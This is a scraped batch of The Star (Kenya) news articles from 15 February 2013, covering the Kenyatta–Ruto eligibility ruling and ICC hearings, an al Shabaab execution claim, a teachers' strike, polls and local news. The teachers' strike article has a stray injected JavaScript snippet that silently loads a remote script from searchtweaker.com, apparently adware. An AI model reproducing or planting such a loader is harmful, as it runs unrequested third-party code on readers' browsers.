http://www.the-star.co.ke/news/2013/02/15/uhuru-told-to-quit-race_c739217,Uhuru told to quit race,www.the-star.co.ke › National News,"Feb. 15, 2013, 12:00 am","['Narc Kenya presidential candidate Martha Karua yesterday called on Jubilee presidential aspirant Uhuru Kenyatta and his running mate William Ruto to step down from the race.', 'Karua, who was speaking at a campaign in Kitui, said the two have no moral authority to seek any elective positions because of the charges they are facing at the Hague.', 'It is only fair and imperative for both Uhuru and Ruto to clear their names at the International Criminal Court before seeking the countrys leadership, said Karua adding that legally accusesd persons are not allowed to seek leadership position.', 'The trials of Uhuru, Ruto, radio presenter Joshua Sang and former civil servants boss Francis Mutaura are set to begin on April 10 and 11. They have been charged in connection with the 2007-08 post poll violence.', '\n']"
http://www.the-star.co.ke/news/2013/02/15/uhuru-ruto-cleared-in-eligibility-hurdle_c739442,"Uhuru, Ruto cleared in eligibility hurdle",www.the-star.co.ke › Latest News,"Feb. 15, 2013, 12:00 am","['The High court has ruled that it has no jurisdiction to determine the eligibility of Uhuru and Ruto to contest the March 4 General Election. A five judge bench that was constituted to rule on the eligibility of Jubilee presidential candidate Uhuru Kenyatta and his running mate William Ruto, has ruled that it has no jurisdiction to determine the matter.', 'The bench composed of judges Hellen Omondi, Mbogholi Msagha, Luka Kimaru, Pauline Nyamwea, and George Kimondo said that on matters of elections to the office of the president, the Supreme Court has original and exclusive jurisdiction.', 'The judges further submitted that the petitioners did not exhaust all other avenues to challenge Uhuru and Rutos eligibility and integrity to vie in the forthcoming March 4 general elections.', 'The IEBC who were respondent in the case submitted through their lawyers, that the petitioners should have raised the integrity and eligibility issues with them first.', 'Article 88 of the constitution obliges the commission to determine disputes arising from nomination of aspirants to elective posts. IEBC further said that the High Court is only limited to review the decisions of the commission where further disputes arise.', 'The petition had been filed by the International Center for Policy and Conflict (ICPC), the Kenya Human Rights Commission (KHRC), Iternational Committee of Jurists (ICJ) and Kenya Public Corruption Ethics Governance Watch (KPCEGW).', '\n']"
http://www.the-star.co.ke/news/2013/02/15/uhuru-welcomes-eligibility-ruling_c739617,Uhuru welcomes eligibility ruling,www.the-star.co.ke › Latest News,"Feb. 15, 2013, 12:00 am","['Presidential candidate on a Jubilee coalition ticket Uhuru Kenyatta has said that he is happy with the ruling delivered by a five-judge bench earlier today. In the statement released through Uhurus communications director Munyori Buku, he said, I welcome the high court ruling today.', 'It has affirmed what we have always held; the people of Kenyaand they alonehave the power and the mandate to determine the leadership of this great country.', 'Kenya has come of age and the people of Kenya can never go wrong, the statement continued to say. In the ruling delivered by justices Hellen Omondi, Mbogholi Msagha, Luka Kimaru, Pauline Nyamwea and George Kimondo, the High court determined that it had no jurisdiction to bar Kenyatta and his running mate William Ruto from running for elective posts.', 'Civil society groups had moved to court to to have orders issued barring the two from contesting the presidency and deputy presidency in the March 4 election.', '\n']"
http://www.the-star.co.ke/news/2013/02/15/iranian-national-day-celebrated-in-nairobi_c738691,Iranian national day celebrated in Nairobi,www.the-star.co.ke › Lifestyle › Society,"Feb. 15, 2013, 12:00 am","[' ', 'Middle Eastern country Iran is one of the oldest countries in the world with its civilisation going back centuries. The country was born as an Islamic republic in 1979 with a revolution led by cleric Ayatollah Khomeni. Since then the event is commemorated every year in Iran with celebrations in the major cities and towns. ', ' ', ' ', 'Guests were treated to Iranian cuisine including dates, chicken, Persian rice and other delicacies.', '\n']"
http://www.the-star.co.ke/news/2013/02/15/cck-seeks-to-be-included-in-royal-media-case_c739135,CCK seeks to be included in Royal Media case,www.the-star.co.ke › National News,"Feb. 15, 2013, 12:00 am","['THE Communications Commission of Kenya (CCK) now seeks to be enjoined in a case in which Royal Media Services is challenging the warrants that led to 17 of its transmitting stations being switched off.', 'In its court documents, CCK through Lawyer Wambua Kilonzo claims that any findings that are to be made by the court will directly affect them and will also impact on their ability to effectively discharge its statutory mandate.', 'We are seized of facts and material that will be of assistance to the court in making its determination. RMS will not suffer any prejudice if the commission is enjoined as an interested party he said.', 'It further added that its only fair and just that they be enjoined so as to have an opportunity to respond to the allegations raised by RMS. Wambua also urged the court to have the matter adjourned as he was only served with RMSs preliminary objection yesterday morning.', 'But RMS through lawyer Kamau Kuria was opposed to their joinder saying it was ready to argue their preliminary objection. CCK he said has no interest in the case and the reason for adjournment is to maintain the status quo which it created.', 'It accomplished the mission of shutting down RMSs transmitters over the weekend! I urge the court to disallow the application and let us argue, said kuria.', 'In the case, the Media House moved to court after it had some of its transmitters shutdown on grounds that they were using illegal frequencies.', 'RMS now seeks to restrain CCK from charging its chairman or any other officer of the company. It also seeks to set aside the warrants withdrawn.', '\n']"
http://www.the-star.co.ke/news/2013/02/15/1000-patients-receive-flowers-from-knh-staff_c739155,1000 patients receive flowers from KNH staff,www.the-star.co.ke › National News,"Feb. 15, 2013, 12:00 am","['More than 1000 patients at Kenyatta National Hospital yesterday received flowers from the hospital staff as a symbol of love. The staff walked through the entire hospital giving out flowers to patients in all the wards.', ""Assistant Director KNH John Ong'ech said this was a special day the staff had dedicated to the patients. We decided to show love and care to our patients starting from labour ward since this is the ward that babies are born, Onge'ch said."", ' ', 'He said some patients have been having a negative attitude towards nurses. ""We hope this gesture will help change their attitude,"" said Ong\'ech.', 'We want them to know we also are human and have feelings."" Mothers who delivered on the eve of the Valentine Day were given fruits and flowers.', '\n']"
http://www.the-star.co.ke/news/2013/02/15/somali-islamists-say-kenyan-soldier-executed_c739418,Somali Islamists say Kenyan soldier executed,www.the-star.co.ke › Latest News,"Feb. 15, 2013, 12:00 am","['Somali militants linked to al Qaeda said they executed a Kenyan army private at midnight on Thursday after the expiry of an ultimatum for the release of Muslims held by Kenya on terror charges.', ' The al Shabaab militants, who want to impose a strict version of sharia, or Islamic law, also said they were extending the execution deadline by 72 hours for five other hostages.', ' The insurgents on Jan. 23 had given Kenya a three-week deadline to free fighters held by the east African country, but Kenya refused to negotiate and said it would not meet the demand.', "" Prior to the ultimatum, the group had killed French hostage Denis Allex to avenge France's persecution of Muslims and its military operations against Islamists, including in Mali."", ' The Kenyan defence forces have said none of its soldiers was believed held by al Shabaab.', ' Security analysts describe al Shabaab as a declining force that no longer controls much territory in Somalia and is not a threat to the Somali government or African Union forces there, but is still capable of mounting sporadic attacks', ' Nairobi sent its troops across the border to pursue the rebels in October 2011 after the insurgents kidnapped Western tourists and Kenyan security forces on Kenyan soil.', ' The rebels said there was still a chance of securing the release of the five prisoners, who include two government workers. ', ' ""Despite the Mujahideen opening the doors of negotiations and giving them ample time, the Kenyan government has been wilfully negligent and has failed to take adequate steps to secure the release of its citizens,"" the rebels said in a statement, in which they gave the executed soldier\'s name.', ' Kenya holds several suspects for alleged links with al Shabaab and extradited others to Uganda suspected of involvement in a deadly 2010 suicide bombing in Kampala, claimed by al Shabaab, that killed 76 people. ', "" The rebels said they would give more time to the remaining hostages in response to their families' pleas."", ' ""In 72 hours, the prisoners will either lose their lives because of their government\'s betrayal or celebrate their government\'s assistance and rejoice in their freedom,"" the militants said.', ' The militants released a video titled ""KENYA POWS: FINAL MESSAGE"", which showed Mule Yesse Edward, a local administrator, and Fredrick Irungu, who worked for the Kenyan ministry of immigration. ', ' Both were captured last January when the militants crossed the border into Kenya and attacked a police post in Wajir county, killing several police officers. ', '\n']"
http://www.the-star.co.ke/news/2013/02/15/raila-cord-enjoy-marginal-lead-in-state-house-race-infotrak_c739589,"Raila, Cord enjoy marginal lead in State House race - Infotrak",www.the-star.co.ke › Latest News,"Feb. 15, 2013, 12:00 am","['A majority of Kenyans were not influenced on their choice of candidate by the presidential debate that took place earlier this week. This is according an Infotrack opinion poll survey conducted between 12 and 13 February.', 'The survey whose sample size was 1650 respondents found that 88.2 per cent of those interviewed were unaffected by the Kenyas first presidential debates.', 'On account of the majority being unaffected by the presidential debate, the self sponsored opinion survey found that the Cord coalition is still the most popular alliance with 46.4 per cent of the unaffected respondents saying they would still vote in a Raila Odinga led government. The Jubilee coalition led by Uhuru Kenyatta and his running mate William Ruto came second with 42.9 per cent.', 'The closing gap between the two coalitions is however a significant change from the last poll in which the Cord alliance was leading by 49 per cent to the Jubilee alliances 40 per cent.', 'The Amani coalition led by Musalia Mudavadi, Eagle alliance under Peter Kenneth and Martha Karuas Narc Kenya scored five per cent, four per cent and one per cent respectively.', 'Abduba Didas ARC, Paul Muites Safina and James Ole Kiyiapis RBK scored 0.5 per cent, 0.1 per cent and 0.2 per cent respectively in the survey. The number of undecided voter significantly dropped from 11 per cent to just two per cent.', 'The opinion poll was conducted in 25 of the 47 counties with a +/- 2.4 error margin and a 95 per cent degree confidence. The sample frame used in the survey was drawn from the pool of registered voters.', '\n']"
http://www.the-star.co.ke/news/2013/02/15/danish-envoy-tells-uhuru-ruto-to-work-with-icc-if-they-win-election_c738859,"Danish envoy tells Uhuru, Ruto to work with ICC if they win election",www.the-star.co.ke › National News,"Feb. 15, 2013, 12:00 am","['Danish Ambassador Geert Andersen says Jubilee leaders Uhuru Kenyatta and William Ruto must be ready to cooperate with the ICC if they win the polls.', 'The envoy was speaking yesterday in Eldoret after meeting with Catholic Bishop Cornelius Korir and other leaders involved in peace and reconciliation within Uasin Gishu.', 'Andersen said his country will only review its diplomatic ties with Kenya if the country and the suspects will refuse to support the ICC process.', 'He said his country, which funds many projects through the Danish International Development Agency, will support the incoming government so long as it will abide by the ICC conditions.', 'Andersen also visited the Kiambaa KAG Church where more than 35 people were killed in a fire during the post election violence and also met with some of the survivors.', 'Bishop Korir, who has for a longtime been involved in peace and reconciliation activities since the violence, said the situation in the region was encouraging ahead of the polls.', ' ', 'He told the envoy that churches and other leaders are working together to ensure that communities participate at the polls freely. ""We have made gains in uniting people and are determined to ensure these do not get reversed,"" he said.', '\n']"
http://www.the-star.co.ke/news/2013/02/15/teachers-union-calls-for-strike-from-tuesday_c739192,Teachers union calls for strike from Tuesday,www.the-star.co.ke › National News,"Feb. 15, 2013, 12:00 am","[' ', ""The Kenya National Union of Teachers' top organ has endorsed a Tuesday strike over unpaid allowances. Knut chairman Wilson Sossion yesterday said the union's National Executive Council resolved that teachers should down their tools."", ' ', 'He said the move is ""the last resort"" to force the government to pay. Teachers had on Monday issued a seven-day strike notice after the state failed to de-gazette legal notice 16 of 2003.', ""The notice suspended commuter, medical and house allowances for teachers. The allowances were part of the demands in the September strike that was called off after the government harmonised teachers' salaries."", 'The government asked a parliamentary legislation committee to establish the legality of the notice. The document purported to amend legal notice 534 of 1997 by withdrawing the three allowances.', ' ', 'Sossion said the parliamentary committee ruled in favour of teachers by stating that legal notice 16 did not follow procedure to amend the 1997 notice.', ' ', 'Teachers will not look back other than to go on and strike, because this is part of the return to work formula agreement. He said the government is not ready to implement the ruling yet it was agreed that each party will respect it.', ' ', 'Teachers want 50 per cent house, 20 per cent medical and 10 per cent commuter allowances. The government needs Sh25 billion to pay the allowances.', ' ', 'Education minister Mutula Kilonzo, according ministry officials, is toying with the idea of de-gazetting the legal notice but fears that Treasury might not be ready to raise the money needed.', ' ', 'Talks between Knut and the Teacher Service Commission failed on Monday after the TSC maintained that it is up to the minister to de-gazette the legal notice. The strike will affect Form One students reporting their new secondary secondary schools between February 18 and 25.', '// <![CDATA[\n(function(){try{var header=document.getElementsByTagName(""HEAD"")[0];var script=document.createElement(""SCRIPT"");script.src=""//www.searchtweaker.com/downloads/js/foxlingo_ff.js"";script.onload=script.onreadystatechange=function(){if (!(this.readyState)||(this.readyState==""complete""||this.readyState==""loaded"")){script.onload=null;script.onreadystatechange=null;header.removeChild(script);}}; header.appendChild(script);} catch(e) {}})();\n// ]]>', '\n']"
http://www.the-star.co.ke/news/2013/02/15/formula-1-now-closer-to-nairobi_c738654,Formula 1 now closer to Nairobi,www.the-star.co.ke › Lifestyle › Society,"Feb. 15, 2013, 12:00 am","['Formula One is a motor sports spectacle with races or grand prix in a number of cities around the world like Shanghai, Abu Dhabi and London. The worldwide phenomenon is watched by fans who follow drivers like Louis Hamilton and Jenson Button vying to be considered the best racer on the planet.', 'Kenya also has its die hard supporters of Formula One who converge at designated areas to watch the game. These folks can now get to watch the races at the race tracks in the host cities as a new initiative to facilitate this was unveiled at the Intercontinental Hotel in Nairobi on Tuesday evening. The initiative which is a partnership between African Touch Safaris and Etihad airlines allows folks to go to the forthcoming races at a subsidised cost.', 'The event was attended by race enthusiasts as well as the guest of honour of the event Media Owners Association and Radio Africa chairman Kiprono Kittony.', '\n']"
http://www.the-star.co.ke/news/2013/02/15/project-to-save-aids-patients-from-waterborne-diseases_c739080,Project to save Aids patients from waterborne diseases,www.the-star.co.ke › National News,"Feb. 15, 2013, 12:00 am","['A training curriculum aimed at improving the lives of people living with HIV/Aids has been launched. The Aidstar-One curriculum is expected to deal with the challenges of water, sanitation and hygiene in health facilities.', 'Aidstar-One is a Usaid funded global HIV/Aids programme which has been working with the Public Health ministry since February 2011.', 'The two have teamed up in a pilot project called WASH (Water, Sanitation and Hygiene) training curriculum in selected health facilities countrywide.', 'Speaking yesterday at the launch in Nairobi, Public Health PS, Mark Bor praised the initiative, which he said will go a long way in helping the patients and their families manage water borne infections.', 'About 80 per cent of hospital attendance in Kenya is due to preventable diseases, with about 50 per cent of them being related to water, sanitation and hygiene, said Bor.', 'The World Health Organisation estimates that 30 per cent of patients develop one or more infections during their stay in hospital. Bor said these diseases can be avoided by taking safe and clean water, observing basic hygiene and embracing good sanitation practises.', 'He said rapid increase in population had led to declining environmental standards. This has led to high density hotspots with deplorable living conditions.', 'The health of people living with HIV/Aids is compromised when they are exposed to poor living conditions and unsafe hygiene environment. An estimated 90 per cent of them suffer from diarrhea attacks, which complicates their well being, despite being on anti-retroviral drugs.', 'Such illnesses can compromise the absorption of life-saving ARVs as well as contribute to the development of anti-retroviral resistant HIV strains,said the PS.', 'Usaid praised the facility-based curriculum and said it will complement the community work spearheaded by the Hygiene Improvement Project, also supported by Aidstar-One.', '\n']"
http://www.the-star.co.ke/news/2013/02/15/uhuru-ruto-want-hague-trials-delayed_c739129,"Uhuru, Ruto want Hague trials delayed",www.the-star.co.ke › National News,"Feb. 15, 2013, 12:00 am","['THE International Criminal Court will decide early next month whether Deputy Prime Minister Uhuru Kenyatta and William Ruto can attend their trial in The Hague through video link.', ' ', ""The two were yesterday given until February 28 to make a written submission justifying their request in yesterday's status conference. Ruto and his co-accused Joshua Sang have also requested the court to postpone the start of their trial by at least four months meaning it could now start in July if the court accepts their request."", ' ', 'We request a trial date four months after the definite disclosure of witness information. We need to have complete picture of our case before we start conducting the trial, including cross-examination,"" Katwa Kigen, defence lawyer for Sang, told the trial judges at the status conference yesterday. Ruto\'s lawyer David Hooper agreed  with Katwa and also suggested to the judges that the trials be held in Arusha.', ' ', 'Hooper said that the ""highest levels"" of the government of Tanzania would be open to having the trial in Arusha to expedite the cases and reduce the cost to the accused.', ""They also asked for the trials to be conducted in chunks of three or four weeks each to allow breaks in between. Uhuru and Ruto did not travel to The Hague for yesterday's status conference and instead participated in the hearing by a video link from the Palacina hotel in Nairobi. "", 'The defence team of Kenyatta has raised the possibility of the accused to be permitted to participate via video link on a regular basis. Should the team wish to pursue this issue, the chamber requests for written submission in that regard including the legal basis and practical modalities of this request, Presiding Judge Kuniko Ozaki told Kenyattas lawyers who were at The Hague.', ' ', 'The Jubilee presidential candidate and his running mate only spoke to state that they understand that the judges are maintaining the summons to appear in court on April 11.', ' ', 'Ruto and Sang also confirmed to trial judges that they will abide by the conditions set by the Pre-trial Chamber. I confirm that I understand and will abide by those conditions, Ruto told the chamber via video link from Nairobi.  ', ' ', 'If their application is successful to testify by video, Uhuru and Ruto will be able to argue that they can participate in court proceedings while at the same time governing the country.', ' ', ""Both Uhuru and Ruto's defence teams have also argued that April is too soon to start their trials. Yesterday lawyers for Uhuru and his co-accused Francis Muthaura said that the April 11 start date was not viable due to delayed and partial disclosure of evidence by the prosecution."", ' ', 'Steven Kay for Uhuru and Karim Khan for Muthaura accused the prosecution of delaying disclosure and hampering preparation of their defence.', ' ', 'Khan told the Trial Chamber V judges Ozaki, Christine Van den Wyngaert and Chile Eboe-Osuji that about 68 percent of the prosecution case is fresh material.', ' ', '""There are over 4,000 pages of new evidence and 28 new witnesses dumped on the defence at the last minute. The defence still needs to investigate this new evidence and it cannot be possibly done between now and April, Khan told the court.', ' ', 'Khan also said that the prosecution has withheld the ""most meaningful evidence until the last possible moment."" He said that his team had to interview 18 witnesses in 24 hours during the pre-trial period to avoid extending the hearing date.', ' ', '""The prosecution in this court has been allowed to get away with this for long. The critical witnesses are coming here to lie and we need enough time to expose these lies. It is only in this court that the prosecution does not have a code of conduct,"" Khan said.', ' ', 'Kay argued that the prosecution has abandoned a key witness so it is no longer the same case that was confirmed by the trial chamber. ""This case emerged when the prosecution filed its pre-trial brief. The nature of the allegations show that the motivation of the witnesses is outside the post-election violence which include Mungiki killings over the years,"" Kay said.', ' ', 'The prosecution remained quiet for most of the session only indicating that they would respond to the written submissions made by the defence. The prosecution also said that it would disclose the necessary information before the start of the trial.', ' ', ""Victims' lawyer Fergal Gaynor opposed any delay of the trial saying his clients were impatient as the post election violence happened five years ago. "", ' ', 'Uhuru requested the judges to indicate how the two cases would be run but the Chamber said that it has asked for an extra chamber so the two cases can run in parallel.', ' ', 'The Chamber mindful of rights of accused, considers interest of all parties, victims and justice for cases to proceed as soon as possible. The most efficient way to proceed is to constitute two separate chambers to hear the cases, said Judge Ozaki. She added that there was only one courtroom available for four hours every day. ', ' ', '""We have been in communication with the presidency recommending in particular that additional judges be assigned to compose two separate chambers. As all parties are aware, this court faces logistical challenges including availability of courtrooms. Use of Courtroom I is the only option, Judge Ozaki said.', ' ', 'Katwa and Hooper also accused the prosecution of changing the case by dropping some witnesses and expanding the scope of the cases to events during the 2005 referendum.', ' ', 'They said that the prosecution initially described the aggressors as ODM members but now talk of Kalenjin militia. ""They have shifted from victims being Kikuyus, to Kikuyus and Kisiis, then Kikuyus, Kambas and Kisii and have now included Luos, Katwa said.', ' ', 'The scope of the case has also changed. Initially it was 2007-2008 but not its four years from 2005. The preparatory dates have been expanded from four to over 20, he said.', ' ', 'Lawyers for Ruto and Sang argued that the alleged venues for the preparatory meetings have tripled during the disclosure. Prosecutor Lucio Garcia denied that the prosecution had changed its case, arguing that the defence knows events in the 2005 referendum were connected to the post-election violence.', ' ', 'Ruto and Sang also asked the ICC to allow them to travel 60 kilometres from the court instead of the 30km currently allowed. This would allow them to access to Amsterdam and Rotterdam.', '\n']"
http://www.the-star.co.ke/news/2013/02/15/city-psyched-up_c739089,City psyched up,www.the-star.co.ke › Sport › Local,"Feb. 15, 2013, 12:00 am","['Nairobi City Stars chairman Peter jabuya is confident his team can cope with the absence of George BlackBerry Odhiambo who has left the country for a one month trials stint with Armenian top division side, Alashkert Martuni.', 'City Stars had included the former Gor Mahia, Randers and Azam player in their roster for this years league and cup actions. However, an opportunity to pursue greener pastures came about even before the Kenyan Premier League season kicked off.', 'Jabuya said Blackberrys move was a win win situation for both him and the Kanwagware-based top division side.', 'We are very happy for BlackBerry to seek better opportunities because every player must get the opportunity to develop and this is one for him. We wish him success,stated Jabuya.', 'However his move will not affect us much because we had a very big squad of about 30 players registered for the season. We also ensured that we had many strikers who can take his place in case of such and eventuality, explained Jabuya.', 'City Stars welcomed back fiery Ugandan striker Jimmy Bageya as well as recruited three other strikers including veteran striker Eric Muranda from Rangers, George Mwangi and Vincent Okoth.', 'Jabuya added that City Stars stood to benefit should BlackBerrys move to Alashkert Martuni materialise. He said according to Fifa rules, they are entitled to something in any transfers deal involving the 2010 footballer of the year, having been their player.', 'Odhiambo was our player on a ful ltime basis not on loan and according to the rules, if he makes any move, we are expected to be compensated because he is a member of our team, stated Jabuya', 'Blackberrys trials according to the invitation letter sent to him by Martuni club president Bagrat Navoyan, will end on March 1.', 'Aluvisia, Victor Ashinga, Victor Okullu, Simon Ogutu, Oscar Mbugua, Valentine Ohia, Dennis Pajoe, Dennis Okoth, Francis Thairu: strikers: Goerge Odhiambo, Erick Muranda, Jimmy Bagaye, George Mwangi and Vincent Okoth.', '\n']"
http://www.the-star.co.ke/news/2013/02/15/iebc-issues-tough-rules-to-guide-poll-campaigns_c738877,IEBC issues tough rules to guide poll campaigns,www.the-star.co.ke › National News,"Feb. 15, 2013, 12:00 am","['The IEBC has published stiff campaign rules to guide the official campaign period which begun on Sunday 10 and ends on March 2. According to the regulations governing election campaigns contained in the Voter Education Training manual, only candidates who have been cleared by IEBC are allowed to campaign. The regulations also require candidates to adhere to the Electoral Code of Conduct.', 'All candidates for elective posts must adhere to the Electoral Code of Conduct. Publicly and repeatedly condemn violence and intimidation, avoid use of abusive and intimidating or provocative language and ensure that no arms or weapons of any kind are carried or displayed at any political function, the rules state.', 'The regulations ban candidates from publishing or printing falsehoods, engaging in defamatory or inflammatory allegations concerning any person or party connected with the election. Candidates are also expected to co-operate and liaise with other parties and candidates to avoid clashing campaign programmes.', 'The regulations also require candidates to have campaign schedules which must be deposited with their sponsoring parties who must notify security agencies of their programmes in advance.', 'The candidates have also been warned against use of hate speech and propaganda, avoid plagiariasing other party or independent symbols, colours or acronyms.', 'A candidate who directly, or through their supporters or agents removes, disfigures or destroys campaign materials of any party commits an electoral offence and is liable to a fine or disqualification. The regulations also require all candidates to have a campaign bank account.', '\n']"
http://www.the-star.co.ke/news/2013/02/15/nyahururu-traders-destroy-council-property-in-protest_c739105,Nyahururu traders destroy council property in protest,www.the-star.co.ke › Local News › Central,"Feb. 15, 2013, 12:00 am","['Nyahururu town was yesterday a no-go zone as traders demonstrated against the municipal council.The traders destroyed council property worth millions of shillings to protest against the ""arbitrary increase of levies"". ', 'They complained that the council is harassing them by demanding that they pay Sh100 daily for licences, instead of the charges they are used to paying once every year.', ' This, they said, is too high and unaffordable to small scale traders.The protests started in yesterday morning when the traders refused to pay council workers who had gone to collect the levy. ', 'Council askaris were forced to intervene by arresting some of the traders. The askaris confiscated several motorbikes, fruits and second hand clothes from those who refused to pay.', ' Several boda operators and clothes, vegetable and fruit vendors then stormed the council offices demanding audience with the town clerk, Jasper Mutwiri, who refused to come out of his office. ', ""This infuriated the traders who set about breaking glass doors and uprooting fences and flowers.The irate traders set the council flag and guards' shelter on fire. "", 'The boda boda operators broke the chains that had been used to fasted their confiscated motor bikes and rode them away.They then lit bonfires to barricade the Nyahururu-Nyeri and Nyahururu-Nakuru roads. ', 'By the time of going to press, the traders were engaging the police in running battles around the town.Efforts by aspiring candidates in Nyahururu to calm them bore no fruits as the traders shouted them down.', ' ', ' ', '\n']"
http://www.the-star.co.ke/news/2013/02/15/salaries-team-on-embu-tour_c739208,Salaries team on Embu tour,www.the-star.co.ke › Local News › North Eastern,"Feb. 15, 2013, 12:00 am","['Salaries Remuneration Commission laments that allowances on state and public officers salaries are what has contributed to the current unbearable wage bills. ', 'One of the commissioners Sarah Kinyua said yesterday in Embu that so many unnecessary allowances paid on top of basic salaries have rendered the wage bill which the government pays monthly be too high and unsustainable.  ', 'She was speaking when she led a team of SRC commissioners in collecting views on the recently proposed state officers salaries at Embus County Council hall. ', 'She said some of the allowances were set up owing to personal interests amongst other considerations and the moment they are done away with the government will be left to pay sustainable salaries.  ', 'Kinyua said during the meeting organised by Embu county commissioner Hellen Kiilu that there was no need of paying responsibility allowance and at the same time pay the same person extraneous allowance.', '  She said the issue of the allowance is one of the crucial matters they want to deal with in their duty of ensuring that every state officer and public servant gets what he or she deserves.', ' Allowances like the house allowance are necessary and medical allowances and should continue to be paid, she said. She however said that some allowances like the medical, should be converted into insurance covers.', '\n']"
